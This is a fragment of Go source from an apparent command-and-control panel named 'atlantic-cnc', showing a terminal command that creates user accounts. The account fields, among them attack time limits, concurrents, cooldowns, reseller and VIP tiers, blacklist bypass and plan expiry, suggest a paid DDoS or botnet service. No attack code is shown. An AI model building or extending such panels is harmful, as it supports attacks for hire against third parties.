...
import (
	...
	"atlantic-cnc/core/sessions/commands/users/edit"
	"atlantic-cnc/core/sessions/commands/users/list"
	...
	Register(&Command{
		...
		Execute: func(Session *sessions.Session_Store, cmd []string) error {
			...
			case "create", "add":
				...
				Session.Channel.Write([]byte("Note -> MFA should be either `True` or `False` !\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mmfa>")

				MFA, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}
                                var update bool
                                if MFA == "True" || MFA == "TRUE" || MFA == "true" {
                                    update = true
                                } else if MFA == "False" || MFA == "FALSE" || MFA == "false" {
                                    update = false
                                } else {
					Session.Channel.Write([]byte("Warning -> You didn't answer with a Boolean.\r\n"))
					return nil
                                }
				error = database.CreateUser(&database.User{Username: Username, Password: Password, Maxtime: MaxTimeINT, Cooldown: CooldownINT, Concurrents: ConcurrentsINT, MFAnew: update, Administrator: build.Config.UserDefaults.Admin, Reseller: build.Config.UserDefaults.Reseller, Vip: build.Config.UserDefaults.VIP, Banned: Session.User.Banned, MaxSessions: Session.User.MaxSessions, PowerSavingExempt: Session.User.PowerSavingExempt, BypassBlacklist: Session.User.BypassBlacklist, PlanExpiry: time.Now().Add((time.Hour*24)*time.Duration(build.Config.UserDefaults.DefaultDaysLeft)).Unix()})
				if error != nil {
					Session.Channel.Write([]byte("\x1b[38;5;1mWarning -> Failed to correctly add user into database\x1b[0m\r\n"))
					return error
				}
